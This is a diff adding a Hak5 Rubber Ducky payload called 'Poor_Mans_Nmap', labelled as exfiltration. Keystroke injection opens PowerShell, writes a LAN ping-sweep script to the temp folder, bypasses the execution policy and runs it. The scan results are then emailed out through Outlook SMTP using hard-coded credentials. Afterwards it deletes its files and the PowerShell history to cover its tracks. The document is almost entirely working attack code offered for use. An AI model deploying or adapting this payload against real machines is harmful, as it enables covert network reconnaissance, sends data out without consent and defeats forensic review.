@@ -1,0 +1,52 @@
+REM Title: Poor_Mans_Nmap
+REM Author: JoustingZebra
+REM Description: Scans the LAN with PowerShell. Then emails results using outlook.
+REM Target: Windows with powershell v5/7.
+REM Props: Hak5, the-jcksn
+REM Version: 1.0
+REM Category: Exfiltration
+
+
+DELAY 1000
+GUI r
+DELAY 1000
+REM Open Powershell, noprofile, noninteractive
+STRING powershell.exe -Nop -Noni
+ENTER
+DELAY 100
+
+REM Write .ps1 file
+REM Scanner only works on class "B" and smaller networks.
+REM Script is optimized, only scans valid IP addresses in the network.
+REM Only scans first LAN it finds. 
+REM IPv4 only :(
+
+STRING Write-Output "function Get-BroadAddr (`$AddrAndCIDR){ `n `$AddrAndCIDR = `$AddrAndCIDR.Split(`"/`") `n `$AddrInBin = (New-IPv4toBin `$AddrAndCidr[0]).ToCharArray() `n for(`$i=0;`$i -lt `$AddrInBin.length;`$i++){ `n if(`$i -ge `$AddrAndCIDR[1]) `n { `n `$AddrInBin[`$i] = `"1`" `n  `n} `n } `n [string[]]`$AddrInInt32 = @() `n  for (`$i = 0;`$i -lt `$AddrInBin.length;`$i++){ `n `$PartialAddrBin += `$AddrInBin[`$i] `n if((`$i+1)%8 -eq 0){ `n `$PartialAddrBin = `$PartialAddrBin -join `"`" `n `$AddrInInt32 += [Convert]::ToInt32(`$PartialAddrBin -join `"`",2) `n  `$PartialAddrBin = `"`" `n } `n  } `n `$AddrInInt32 = `$AddrInInt32 -join `".`" `n return `$AddrInInt32 `n } `n function New-IPv4toBin (`$ipv4){ `n `$BinNum = `$ipv4 -split '\.' | ForEach-Object {[System.Convert]::ToString(`$_,2).PadLeft(8,'0')} `n return `$binNum -join `"`" `n } `n  `$Adapter = (Get-NetAdapter | Where-Object {`$_.status -eq 'Up'} | Select-Object -First 1) `n `$AdapterAddr=(Get-NetIPAddress -InterfaceIndex `$Adapter.ifIndex | Where-Object {`$_.ipv4address}) `n `$IPaddr=[ipaddress](`$AdapterAddr.IPAddress) `n  `$CIDRSubMask=(Get-NetIPAddress -InterfaceIndex `$Adapter.ifIndex | Select-Object -ExpandProperty PrefixLength) `n  `$IPAddrAndMask=(`$IPaddr | select-object -ExpandProperty IPAddressToString ) + `"/`" +(`$CIDRSubMask | Out-String) `n Write-Host `"Localhost = `$IPaddrAndMask`" `n `$SubMask = [ipaddress]([math]::pow(2, 32) -1 -bxor [math]::pow(2, (32 - `$CIDRSubMask))-1) `n Write-Host `"Subnet mask = `$SubMask`" `n  `$NetAddr=[ipaddress](`$IPaddr.address -band `$SubMask.address) `n Write-Host `"Network Address = `$NetAddr`" `n `$NetAddrOctet0=[int]([System.Net.IpAddress]::Parse(`$NetAddr)).GetAddressbytes()[0] `n `$NetAddrOctet1=[int]([System.Net.IpAddress]::Parse(`$NetAddr)).GetAddressbytes()[1] `n `$NetAddrOctet2=[int]([System.Net.IpAddress]::Parse(`$NetAddr)).GetAddressbytes()[2] `n  `$NetAddrOctet3=[int]([System.Net.IpAddress]::Parse(`$NetAddr)).GetAddressbytes()[3] `n  `$BroadAddr=[ipaddress](Get-BroadAddr(`$IPAddrAndMask)) `n Write-Host `"Broadcast Address = `$BroadAddr`" `n  `$BroadAddrOctet2=[int]([System.Net.IpAddress]::Parse(`$BroadAddr)).GetAddressbytes()[2] `n  `$BroadAddrOctet3=[int]([System.Net.IpAddress]::Parse(`$BroadAddr)).GetAddressbytes()[3] `n  Write-Host `"`n`" `n  Write-Host `"### Scanning Network `$NetAddr - `$BroadAddr ###`" `n  Write-Host `"`n`" `n  for(`$i=`$NetAddrOctet3+1; `$i -lt `$BroadAddrOctet3 ; `$i++){ `n  `$pcomplete = (`$i / `$BroadAddrOctet3) * 100 `n  `$PingAddr=[string]([string]`$NetAddrOctet0 + `".`" + [string]`$NetAddrOctet1 + `".`" + [string]`$NetAddrOctet2 + `".`" + [string]`$i) `n Write-Progress -Activity Scanning -Status 'Progress->' -PercentComplete `$pcomplete -CurrentOperation OuterLoop `n if ((Test-Connection `$PingAddr -Quiet -Count 1) -and ([string]`$IPaddr -ne `$PingAddr)){ `n  `$Output=`$(Get-NetNeighbor -IPAddress `$PingAddr -ErrorAction SilentlyContinue | Select-Object -Property IPAddress,LinkLayerAddress,State | Format-Table -HideTableHeaders | Out-String) `n `$Output=(`$Output -replace `"`n`",`"`") `n Write-Host `$Output `n  } `n if (`$NetAddrOctet2 -ne `$BroadAddrOctet2){ `n  for (`$j=`$NetAddrOctet2+1; `$j -lt `$BroadAddrOctet2 ; `$j++){ `n `$pincomplete = (`$j / `$BroadAddrOctet2) * 100 `n Write-Progress -Id 1 -Activity Updating -Status 'Progress' -PercentComplete `$pincomplete -CurrentOperation InnerLoop `n if (Test-Connection `$PingAddr -Quiet -Count 1){ `n Write-Host `$PingAddr `n } `n } `n } `n } `n " | Out-File $ENV:temp/netscan.ps1
+ENTER
+DELAY 1000
+REM Give process ability to run unsigned scripts
+STRING Set-ExecutionPolicy Bypass -Scope Process
+DELAY 100
+ENTER
+DELAY 100
+STRING cd $ENV:temp
+DELAY 100
+ENTER
+DELAY 100
+
+REM Execute and email results as .txt file
+REM Line condensed into one so the rubber ducky can be removed without waiting for the script to finish.
+REM The script is not multi-threaded, so it takes about 6 minutes to scan a class "C" subnet.
+REM Conducts cleanup and removes history to protect email creds.
+
+REM	~~~~~~~CHANGE THE USERNAME (3 times) AND PASSWORD (once) IN THE FOLLOWING~~~~~
+STRING .\netscan.ps1 | Out-File netscan.txt && Send-MailMessage -From user@example.com -To user@example.com -Subject "LAN scan" -Body "From Rubber Ducky" -Attachment $ENV:temp\netscan.txt -SmtpServer smtp-mail.outlook.com -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList user@example.com, (ConvertTo-SecureString -String "supersecretpassword" -AsPlainText -Force)) && Remove-Item netscan.* -Force && Remove-Item (Get-PSReadlineOption).HistorySavePath -Force && Clear-History
+DELAY 100
+ENTER
+REM 27.3 hour delay to allow script full time to scan a class "B" subnet then close process
+DELAY 10000
+REPEAT 9831
+STRING EXIT
+DELAY 100
+ENTER
+
